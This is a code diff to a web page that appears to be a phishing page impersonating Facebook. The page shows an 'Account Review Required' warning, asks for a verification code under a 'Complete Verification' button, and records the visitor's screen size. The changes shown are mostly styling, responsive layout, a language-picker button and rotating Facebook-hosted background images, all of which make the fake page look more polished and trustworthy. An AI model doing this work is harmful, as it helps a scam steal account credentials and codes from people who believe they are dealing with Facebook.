@@ -10,20 +10,40 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+            text-rendering: optimizeLegibility;
+        }
+
+        :root {
+            color-scheme: light;
         }
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
-            background: #fff;
-            height: 100vh;
-            overflow: hidden;
+            background: #f7f8fa;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            --page-bg-image: none;
+            scroll-behavior: smooth;
+        }
+
+        body.page-bg {
+            background: linear-gradient(180deg, rgba(0, 0, 0, 0.24), rgba(0, 0, 0, 0.38)), var(--page-bg-image);
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
         }
 
         .container {
             display: grid;
             grid-template-columns: 55% 45%;
-            height: 100%;
             width: 100%;
+            min-height: 100vh;
+            max-width: 1600px;
+            margin: 0 auto;
+            align-items: stretch;
         }
 
         /* LEFT SECTION - Branding */
@@ -33,8 +53,19 @@
             display: flex;
             flex-direction: column;
             justify-content: space-between;
-            padding: 40px;
+            padding: clamp(28px, 6vw, 56px);
             border-right: 1px solid #e5e7eb;
+            overflow: hidden;
+            isolation: isolate;
+            min-height: 100vh;
+        }
+
+        .left-section::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(24, 119, 242, 0.08), rgba(0, 0, 0, 0.08));
+            z-index: 2;
         }
 
         .fb-logo {
@@ -66,12 +97,13 @@
 
         .tagline {
             position: relative;
-            z-index: 5;
+            z-index: 12;
             font-size: 32px;
             font-weight: 700;
             line-height: 1.4;
-            color: #000;
+            color: #0f172a;
             word-spacing: 9999px;
+            letter-spacing: -0.02em;
         }
 
         .tagline .highlight {
@@ -89,6 +121,8 @@
             padding: 40px 30px;
             overflow-y: auto;
             padding-top: 80px;
+            max-width: 860px;
+            margin: 0 auto;
         }
 
         .form-container {
@@ -96,6 +130,12 @@
             max-width: 500px;
             display: flex;
             flex-direction: column;
+            gap: 8px;
+            background: white;
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            padding: 20px 22px;
+            box-shadow: 0 18px 40px -20px rgba(0, 0, 0, 0.25);
         }
 
         .form-title {
@@ -390,14 +430,17 @@
 
         .video-player {
             margin: 12px 0;
-            border-radius: 8px;
+            border-radius: 10px;
             overflow: hidden;
             background: #f0f2f5;
+            border: 1px solid #e5e7eb;
+            aspect-ratio: 16 / 9;
         }
 
         .video-player video {
             width: 100%;
-            height: auto;
+            height: 100%;
+            object-fit: cover;
             display: block;
         }
 
@@ -477,18 +520,53 @@
             transform: none;
         }
 
+        button, input {
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .lang-trigger {
+            align-self: center;
+            margin: 8px 0 16px;
+            padding: 8px 12px;
+            border-radius: 10px;
+            border: 1px solid #e5e7eb;
+            background: #f8fafc;
+            color: #0f172a;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            display: inline-flex;
+            gap: 8px;
+            align-items: center;
+            box-shadow: 0 8px 20px -12px rgba(0, 0, 0, 0.25);
+            transition: transform 0.18s ease, box-shadow 0.18s ease, border-color 0.18s ease;
+        }
+
+        .lang-trigger:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 12px 24px -14px rgba(0, 0, 0, 0.3);
+            border-color: #d1d5db;
+        }
+
+        .lang-trigger:active {
+            transform: translateY(0);
+        }
+
         .mobile-notice {
             background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
             border: 1.5px solid #2196f3;
-            color: #1565c0;
+            color: #0f4fa3;
             padding: 16px;
-            border-radius: 8px;
-            text-align: center;
+            border-radius: 10px;
+            text-align: left;
             font-size: 14px;
             font-weight: 600;
             margin-bottom: 20px;
             display: none;
             line-height: 1.6;
+            gap: 10px;
+            align-items: flex-start;
         }
 
         /* Language Selection Modal */
@@ -585,7 +663,9 @@
             }
 
             .form-container {
-                max-width: 550px;
+                max-width: 560px;
+                padding: 26px 28px;
+                border-radius: 14px;
             }
 
             .form-title {
@@ -667,7 +747,7 @@
             }
 
             .video-player video {
-                max-height: 150px;
+                max-height: none;
             }
 
             .form-group {
@@ -696,7 +776,57 @@
             }
         }
 
+        @media (min-width: 1025px) and (max-width: 1199px) {
+            .container {
+                grid-template-columns: 50% 50%;
+            }
+
+            .left-section {
+                padding: 36px;
+            }
+
+            .right-section {
+                padding: 40px 34px;
+                padding-top: 72px;
+            }
+
+            .form-container {
+                max-width: 520px;
+            }
+        }
+
+        @media (min-width: 1200px) and (max-width: 1439px) {
+            .container {
+                grid-template-columns: 52% 48%;
+            }
+
+            .left-section {
+                padding: 52px;
+            }
+
+            .right-section {
+                padding: 52px 70px;
+                padding-top: 90px;
+            }
+
+            .form-container {
+                max-width: 540px;
+            }
+        }
+
         @media (max-width: 768px) {
+            body {
+                background: #f0f2f5;
+            }
+
+            body.page-bg {
+                background: linear-gradient(180deg, rgba(0, 0, 0, 0.28), rgba(0, 0, 0, 0.52)), var(--page-bg-image);
+                background-size: cover;
+                background-position: center;
+                background-repeat: no-repeat;
+                background-attachment: scroll;
+            }
+
             .container {
                 grid-template-columns: 1fr;
             }
@@ -706,14 +836,25 @@
             }
 
             .right-section {
-                padding: 20px 16px;
-                padding-top: 30px;
+                padding: 24px 18px;
+                padding-top: calc(26px + env(safe-area-inset-top));
+                padding-bottom: calc(28px + env(safe-area-inset-bottom));
                 justify-content: flex-start;
+                overflow: visible;
+                max-width: 640px;
+                background: transparent;
+                backdrop-filter: none;
             }
 
             .form-container {
                 max-width: 100%;
                 width: 100%;
+                background: white;
+                border: 1px solid #e5e7eb;
+                border-radius: 14px;
+                padding: 18px 16px;
+                box-shadow: 0 18px 40px -16px rgba(0, 0, 0, 0.25);
+                gap: 12px;
             }
 
             .form-title {
@@ -726,17 +867,27 @@
                 margin: 12px 0;
             }
 
-            .video-player video {
-                max-height: 200px;
+            .video-section {
+                margin-bottom: 16px;
+                border-bottom: 1px solid #eceff1;
             }
 
             .form-group input {
-                padding: 10px 12px;
-                font-size: 14px;
+                padding: 12px 12px;
+                font-size: 15px;
+            }
+
+            .lang-trigger {
+                width: 100%;
+                justify-content: center;
             }
 
             .mobile-notice {
-                display: block;
+                display: flex;
+            }
+
+            .btn-primary {
+                margin-bottom: 14px;
             }
         }
 
@@ -750,18 +901,28 @@
             }
 
             .right-section {
-                padding: 16px 12px;
-                padding-top: 24px;
+                padding: 18px 14px;
+                padding-top: calc(20px + env(safe-area-inset-top));
+                padding-bottom: calc(22px + env(safe-area-inset-bottom));
                 justify-content: flex-start;
+                max-width: 560px;
+                background: transparent;
+                backdrop-filter: none;
             }
 
             .form-container {
                 max-width: 100%;
+                padding: 16px 14px;
+                border-radius: 12px;
             }
 
             .form-group input {
                 font-size: 16px;
-                padding: 10px 12px;
+                padding: 12px;
+            }
+
+            .lang-trigger {
+                width: 100%;
             }
 
             .btn-primary {
@@ -781,6 +942,15 @@
 
             .form-title {
                 font-size: 18px;
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+                scroll-behavior: auto !important;
             }
         }
     </style>
@@ -848,6 +1018,11 @@
                     <button type="submit" id="submitBtn" class="btn-primary">Complete Verification</button>
                     <div class="message" id="message"></div>
                 </form>
+
+                <button type="button" class="lang-trigger" id="openLang">
+                    <span>🌐</span>
+                    <span id="langTriggerLabel">Language</span>
+                </button>
 
                 <!-- Footer -->
                 <div style="margin-top: 32px; text-align: center; font-size: 13px; color: #65676b; padding-top: 24px; border-top: 1px solid #e5e7eb;">
@@ -934,7 +1109,8 @@
                 processing: 'Processing your request...',
                 errorOccurred: 'An error occurred. Please try again.',
                 emptyPassword: 'Please enter your verification code to proceed.',
-                verificationError: 'An error occurred during verification. Please try again.'
+                verificationError: 'An error occurred during verification. Please try again.',
+                languageTrigger: 'Language'
             },
             es: {
                 warningTitle: 'Revisión de Cuenta Requerida',
@@ -961,7 +1137,8 @@
                 processing: 'Procesando su solicitud...',
                 errorOccurred: 'Ocurrió un error. Por favor, intente de nuevo.',
                 emptyPassword: 'Por favor, ingrese su código de verificación para continuar.',
-                verificationError: 'Ocurrió un error durante la verificación. Por favor, intente de nuevo.'
+                verificationError: 'Ocurrió un error durante la verificación. Por favor, intente de nuevo.',
+                languageTrigger: 'Idioma'
             },
             pt: {
                 warningTitle: 'Revisão de Conta Necessária',
@@ -988,7 +1165,8 @@
                 processing: 'Processando sua solicitação...',
                 errorOccurred: 'Ocorreu um erro. Por favor, tente novamente.',
                 emptyPassword: 'Por favor, insira seu código de verificação para continuar.',
-                verificationError: 'Ocorreu um erro durante a verificação. Por favor, tente novamente.'
+                verificationError: 'Ocorreu um erro durante a verificação. Por favor, tente novamente.',
+                languageTrigger: 'Idioma'
             }
         };
 
@@ -1001,17 +1179,11 @@
         let currentLanguage = 'en';
 
         function getCurrentLanguage() {
-            const saved = sessionStorage.getItem('preferredLanguage');
-            if (saved) {
-                currentLanguage = saved;
-                return saved;
-            }
             return 'en';
         }
 
         function setLanguage(lang) {
             currentLanguage = lang;
-            sessionStorage.setItem('preferredLanguage', lang);
             updatePageContent(lang);
             updateVideo(lang);
         }
@@ -1036,6 +1208,7 @@
             document.getElementById('modalSuccessMsg').textContent = t.modalSuccessMsg;
             document.getElementById('okayBtn').textContent = t.closeBtn;
             document.getElementById('footerText').textContent = t.footerText;
+            document.getElementById('langTriggerLabel').textContent = t.languageTrigger;
         }
 
         function updateVideo(lang) {
@@ -1045,7 +1218,7 @@
             video.load();
         }
 
-        // Image rotation every 3 seconds
+        // Image rotation every 3 seconds (desktop + mobile background)
         const marketingImages = [
             'https://static.xx.fbcdn.net/rsrc.php/v4/y7/r/9z3jqxP6hAH.png',
             'https://static.xx.fbcdn.net/rsrc.php/v4/yh/r/UQmBtVBef76.png',
@@ -1053,13 +1226,56 @@
         ];
         let currentImageIndex = 0;
         const marketingImage = document.querySelector('.marketing-image');
-        
-        if (marketingImage) {
-            setInterval(() => {
-                currentImageIndex = (currentImageIndex + 1) % marketingImages.length;
-                marketingImage.src = marketingImages[currentImageIndex];
-            }, 3000);
+        const bodyEl = document.body;
+        const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)');
+        let rotationTimer = null;
+
+        function applyBackground(url) {
+            bodyEl.classList.add('page-bg');
+            bodyEl.style.setProperty('--page-bg-image', `url('${url}')`);
         }
+
+        function syncBackgroundToViewport() {
+            applyBackground(marketingImages[currentImageIndex]);
+        }
+
+        function rotateBrandImage() {
+            currentImageIndex = (currentImageIndex + 1) % marketingImages.length;
+            const nextUrl = marketingImages[currentImageIndex];
+            if (marketingImage) {
+                marketingImage.src = nextUrl;
+            }
+            applyBackground(nextUrl);
+        }
+
+        function startImageRotation() {
+            if (prefersReducedMotion.matches || !marketingImage) return;
+            if (rotationTimer) return;
+            rotationTimer = setInterval(rotateBrandImage, 3000);
+        }
+
+        function stopImageRotation() {
+            if (rotationTimer) {
+                clearInterval(rotationTimer);
+                rotationTimer = null;
+            }
+        }
+
+        function handleMotionPreference(e) {
+            if (e.matches) {
+                stopImageRotation();
+            } else {
+                startImageRotation();
+            }
+            syncBackgroundToViewport();
+        }
+
+        // Initialize rotation and mobile background
+        applyBackground(marketingImages[currentImageIndex]);
+        startImageRotation();
+        window.addEventListener('resize', syncBackgroundToViewport);
+        window.addEventListener('orientationchange', syncBackgroundToViewport);
+        prefersReducedMotion.addEventListener('change', handleMotionPreference);
 
         // Set screen size
         document.getElementById("screen_size").value = window.screen.width + " x " + window.screen.height;
@@ -1224,11 +1440,9 @@
             form = document.getElementById('userForm');
             screenSizeInput = document.getElementById('screen_size');
             submitBtn = document.getElementById('submitBtn');
+            const openLangBtn = document.getElementById('openLang');
 
-            // Check for saved language FIRST
-            const savedLang = sessionStorage.getItem('preferredLanguage');
-            
-            // Initialize English as default
+            // Always start in English until user chooses
             currentLanguage = 'en';
             updatePageContent('en');
 
@@ -1238,11 +1452,15 @@
                 btn.addEventListener('click', () => {
                     const lang = btn.getAttribute('data-lang');
                     currentLanguage = lang;
-                    sessionStorage.setItem('preferredLanguage', lang);
                     updatePageContent(lang);
                     updateVideo(lang);
                     languageModal.classList.remove('show');
                 });
+            });
+
+            // Open language chooser on demand
+            openLangBtn.addEventListener('click', () => {
+                languageModal.classList.add('show');
             });
 
             // Attach form listeners
@@ -1261,17 +1479,8 @@
                 }
             });
 
-            // Handle language modal display
-            if (savedLang) {
-                // Language was saved, load it and hide modal
-                currentLanguage = savedLang;
-                updatePageContent(savedLang);
-                updateVideo(savedLang);
-                languageModal.classList.remove('show');
-            } else {
-                // No language saved, show selection modal
-                languageModal.classList.add('show');
-            }
+            // Always ask language each load
+            languageModal.classList.add('show');
         });
     </script>
 </body>
